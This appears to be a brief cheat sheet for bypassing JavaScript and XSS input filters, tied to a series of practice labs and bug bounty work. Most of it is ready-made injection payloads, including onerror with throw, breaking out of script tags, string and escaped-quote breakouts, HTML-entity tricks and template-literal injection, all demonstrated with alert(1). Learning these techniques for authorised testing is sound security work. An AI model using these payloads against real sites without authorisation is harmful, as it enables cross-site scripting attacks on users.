# JavaScript Filter Bypass CheatSheet

## Scenario

Application blocks:

```javascript
alert(1)
```

or filters special characters.

---

# onerror + throw

Payload:

```javascript
onerror=alert;throw 1
```

---

# Execution Flow

```text
Assign onerror
        ↓
Throw Exception
        ↓
onerror Executes
```

---

# Why It Works

```javascript
onerror = alert;
throw 1;
```

---

# Useful Techniques

## Script Termination

```html
</script><script>alert(1)</script>
```

---

## String Breakout

```javascript
';alert(1)//
```

---

## Escaped Quote Bypass

```javascript
\';alert(1)//
```

---

## HTML Entity Bypass

```html
&apos;-alert(1)-&apos;
```

---

## Template Literal

```javascript
${alert(1)}
```

---

# Related Labs

```text
Lab18
Lab19
Lab20
Lab21
Lab22
Lab23
```

---

# Bug Bounty Reminder

Most filters block:

```text
Specific Payloads
```

not:

```text
JavaScript Language Features
```